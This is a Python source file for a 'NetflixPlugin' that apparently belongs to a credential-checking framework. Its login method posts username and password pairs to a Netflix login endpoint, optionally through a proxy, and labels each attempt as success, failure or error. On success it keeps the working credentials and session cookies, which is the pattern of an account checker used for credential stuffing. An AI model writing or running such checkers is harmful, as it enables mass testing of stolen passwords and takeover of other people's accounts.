from typing import Optional, Dict, Any
import asyncio

from ...core.plugin_interface import WebPlugin, LoginResult, AuthResult, SessionData


class NetflixPlugin(WebPlugin):
    name = "netflix"
    version = "2.0.0"
    
    async def login(self, username: str, password: str,
                   session: Optional[Any] = None,
                   proxy: Optional[str] = None) -> LoginResult:
        import httpx
        
        start = asyncio.get_event_loop().time()
        
        try:
            async with httpx.AsyncClient(proxies=proxy) as client:
                resp = await client.post(
                    "https://www.netflix.com/api/login",
                    json={
                        "userLoginId": username,
                        "password": password,
                        "rememberMe": False
                    }
                )
                
                elapsed = (asyncio.get_event_loop().time() - start) * 1000
                
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("success"):
                        return LoginResult(
                            result=AuthResult.SUCCESS,
                            username=username,
                            password=password,
                            response_time_ms=elapsed,
                            session=SessionData(cookies=dict(client.cookies))
                        )
                
                if resp.status_code == 401:
                    return LoginResult(
                        result=AuthResult.FAILURE,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                return LoginResult(
                    result=AuthResult.UNKNOWN,
                    username=username,
                    password=password,
                    response_time_ms=elapsed
                )
                
        except Exception as e:
            return LoginResult(
                result=AuthResult.ERROR,
                username=username,
                password=password,
                message=str(e)
            )